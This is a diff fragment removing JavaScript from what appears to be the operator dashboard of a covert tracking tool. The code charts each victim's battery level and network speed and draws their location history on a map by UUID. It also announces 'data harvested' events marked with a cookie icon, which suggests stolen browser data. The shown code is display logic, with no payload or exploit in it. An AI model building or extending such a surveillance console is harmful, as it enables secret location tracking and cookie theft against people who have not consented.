-            if (bc) {
-                new Chart(bc, { type:'line', data:{ labels, datasets:[{ label:'Battery %', data:batteryData, borderColor:'#5de4c7', backgroundColor:'rgba(93,228,199,0.1)', fill:true, tension:0.3, pointRadius:2 }] }, options:{...chartOpts, plugins:{...chartOpts.plugins,title:{display:true,text:'🔋 Battery Level',color:'rgba(255,255,255,0.6)',font:{size:13}}}} });
-            }
-            const nc = document.getElementById('metricsChartNetwork');
-            if (nc) {
-                new Chart(nc, { type:'line', data:{ labels, datasets:[{ label:'Downlink Mbps', data:downlinkData, borderColor:'#a594fd', backgroundColor:'rgba(165,148,253,0.1)', fill:true, tension:0.3, pointRadius:2 }] }, options:{...chartOpts, plugins:{...chartOpts.plugins,title:{display:true,text:'🌐 Network Downlink (Mbps)',color:'rgba(255,255,255,0.6)',font:{size:13}}}} });
-            }
-        }, 100);
-    } catch(e) {
-        console.error('Load metrics error:', e);
-    }
-}
-
-function showDataPopup(title, content) {
-    let popup = document.getElementById('dataPopup');
-    if (!popup) {
-        popup = document.createElement('div');
-        popup.id = 'dataPopup';
-        popup.style.cssText = 'position:fixed;inset:0;z-index:100000;display:flex;align-items:center;justify-content:center;background:rgba(0,0,0,0.7);backdrop-filter:blur(8px);opacity:0;transition:opacity 0.3s;';
-        popup.innerHTML = '<div style="width:90%;max-width:700px;max-height:85vh;background:rgba(17,17,40,0.98);border:1px solid rgba(255,255,255,0.1);border-radius:20px;box-shadow:0 24px 64px rgba(0,0,0,0.5);overflow:hidden;display:flex;flex-direction:column"><div style="display:flex;justify-content:space-between;align-items:center;padding:16px 24px;border-bottom:1px solid rgba(255,255,255,0.06)"><h3 id="dataPopupTitle" style="font-size:1rem;font-weight:600"></h3><button onclick="closeDataPopup()" style="background:none;border:none;color:rgba(255,255,255,0.4);cursor:pointer;font-size:1.2rem;padding:4px 8px">✕</button></div><div id="dataPopupContent" style="flex:1;overflow-y:auto"></div></div>';
-        document.body.appendChild(popup);
-    }
-    document.getElementById('dataPopupTitle').textContent = title;
-    document.getElementById('dataPopupContent').innerHTML = content;
-    popup.style.display = 'flex';
-    requestAnimationFrame(() => popup.style.opacity = '1');
-}
-
-function closeDataPopup() {
-    const popup = document.getElementById('dataPopup');
-    if (popup) {
-        popup.style.opacity = '0';
-        setTimeout(() => popup.style.display = 'none', 300);
-    }
-}
-
-// ═══════════════════════════════════════════════════════════════════
-// NEW: LOCATION HISTORY PATH ON MAP
-// ═══════════════════════════════════════════════════════════════════
-let locationPaths = {};
-
-async function showLocationPath(uuid) {
-    if (!map || !mapInitialized) { initMap(); }
-    try {
-        const data = await api('/api/location-history/' + uuid);
-        const history = data?.history || [];
-        if (history.length < 2) {
-            addNotification('📍', 'Not enough location points for ' + truncUUID(uuid));
-            return;
-        }
-        // Remove existing path for this user
-        if (locationPaths[uuid]) {
-            map.removeLayer(locationPaths[uuid]);
-        }
-        const points = history.map(h => [h.latitude, h.longitude]);
-        const polyline = L.polyline(points, {
-            color: '#a594fd',
-            weight: 3,
-            opacity: 0.8,
-            dashArray: '8, 6',
-            smoothFactor: 1
-        }).addTo(map);
-        polyline.bindPopup('<div style="font-family:Inter,sans-serif;font-size:0.8rem"><b style="color:#a594fd">Path: ' + truncUUID(uuid, 12) + '</b><br><span style="color:rgba(255,255,255,0.5)">' + history.length + ' points</span></div>');
-        locationPaths[uuid] = polyline;
-        map.fitBounds(polyline.getBounds().pad(0.2));
-        addNotification('🗺️', 'Location path drawn for ' + truncUUID(uuid));
-    } catch(e) {
-        console.error('Location path error:', e);
-    }
-}
-
-// Listen for real-time data harvest events
-socket.on('data:harvest', (data) => {
-    addNotification('🍪', 'Data harvested from ' + truncUUID(data.uuid));
-});
-
-// Listen for real-time metrics events
-socket.on('metrics:update', (data) => {
-    if (data && data.uuid && allUsers[data.uuid]) {
-        if (!allUsers[data.uuid].metrics_history) allUsers[data.uuid].metrics_history = [];
-        allUsers[data.uuid].metrics_history.push(data.metrics);
-    }
-});
-
 </script>
 </body>
 </html>
